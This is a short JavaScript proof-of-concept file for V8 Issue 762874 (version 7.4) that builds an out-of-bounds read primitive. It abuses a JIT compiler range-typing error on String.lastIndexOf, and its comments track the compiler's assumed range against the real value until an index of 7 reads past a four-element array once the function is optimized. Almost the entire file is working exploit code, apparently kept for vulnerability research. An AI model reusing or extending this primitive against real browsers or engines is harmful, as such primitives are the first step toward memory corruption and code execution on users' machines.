/*************************************************************
 * File Name: oldOOBRead.js
 * 
 * Created on: 2020-03-09 04:44:37
 * Author: raycp
 * 
 * Last Modified: 2020-03-09 06:11:49
 * Description: oob read primitive for Issue 762874, on version 7.4
************************************************************/

const maxLength = 1073741799 //%StringMaxLength();
const s = 'A'.repeat(maxLength);

function foo() {

    let idx  = s.lastIndexOf("", maxLength);
    // compiler: Range(-1.0, String::kMaxLength - 1.0)
    // reality: String::kMaxLength
    idx += 25;
    // compiler: Range(24, 0x3fffffff)
    // reality: 0x40000000
    idx = idx >>30;
    // compiler: Range(0, 0)
    // reality: 1
    idx = idx * 7;
    // compiler: Range(0, 0)
    // reality: 7

    let arr = [1.1, 2.2, 3.3, 4.4];
    
    return arr[idx];
}

foo();
%OptimizeFunctionOnNextCall(foo);
let oobVal = foo();
print(oobVal);
